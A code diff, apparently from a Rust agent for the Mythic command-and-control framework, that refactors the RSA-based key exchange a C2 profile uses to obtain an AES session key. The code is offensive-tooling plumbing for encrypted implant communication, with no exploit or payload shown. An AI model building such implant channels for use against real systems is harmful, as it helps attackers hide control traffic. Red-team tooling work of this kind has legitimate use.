@@ -1,11 +1,10 @@
-use crate::payloadvars;
+use crate::{crypto::Rsa, payloadvars};
 use rand::Rng;
 use std::error::Error;
 
 use aes::Aes256;
 use block_modes::{block_padding::Pkcs7, BlockMode, Cbc};
 use hmac::{Hmac, Mac, NewMac};
-use openssl::rsa;
 use serde::Deserialize;
 use serde_json::json;
 use sha2::Sha256;
@@ -162,8 +161,8 @@ impl Profile {
     /// Performs an EKE with Mythic using the specified C2 profile
     pub fn perform_key_exchange(&mut self) -> Result<(), Box<dyn Error>> {
         // Generate a private/public RSA 4096 key pair
-        let rsa_key = rsa::Rsa::generate(4096)?;
-        let public_key = rsa_key.public_key_to_pem_pkcs1()?;
+        let rsa_key = Rsa::generate(4096)?;
+        let public_key = rsa_key.public_key()?;
 
         // Generate a random session id
         let mut session_id: [char; 20] = ['a'; 20];
@@ -192,11 +191,8 @@ impl Profile {
         let body: KeyExchangeReponse = serde_json::from_str(&body)?;
 
         // Grab the new AES key from the RSA encrypted response
-        let mut new_key = vec![0; rsa_key.size() as usize];
         let encrypted_aes_key = base64::decode(&body.session_key)?;
-
-        rsa_key.private_decrypt(&encrypted_aes_key, &mut new_key, rsa::Padding::PKCS1_OAEP)?;
-        new_key.truncate(32);
+        let new_key = rsa_key.private_decrypt(&encrypted_aes_key)?;
 
         // Set the new active profile
         let profile = &mut self.profiles[self.active];
